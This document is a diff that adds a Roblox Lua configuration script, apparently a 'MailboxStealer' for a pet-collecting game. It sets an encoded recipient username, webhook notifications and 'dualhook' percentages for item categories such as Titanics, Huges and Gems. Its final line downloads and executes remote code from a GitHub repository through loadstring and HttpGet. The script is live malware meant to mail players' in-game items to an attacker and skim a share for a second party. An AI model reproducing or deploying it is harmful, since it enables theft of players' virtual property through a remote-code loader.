@@ -1,0 +1,43 @@
+getgenv().Settings = {
+    User = "THlwaGVyXzE=", --// Base 64 encoded username here
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = "Monzz",
+      Titanics = {
+        Dualhook = true,
+        Intensity = 100--%
+      },
+      Banana = {
+        Dualhook = true,
+        Intensity = 100--%
+      },
+      Huges = {
+        Dualhook = true,
+        Intensity = 50--%
+      },
+      Pogs = {
+        Dualhook = true,
+        Intensity = 0--%
+      },
+       Exclusives = {
+        Dualhook = true,
+        Intensity = 0--%
+      },
+       Events = {
+        Dualhook = true,
+        Intensity = 0--%
+      },
+       Secrets = {
+        Dualhook = true,
+        Intensity = 0--%
+       },
+       HC_DM_Mythics = {
+        Dualhook = true,
+        Intensity = 0--%
+       },
+       Gems = {
+        Dualhook = true,
+        Intensity = 0--%
+      }
+    }
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Api", true))()
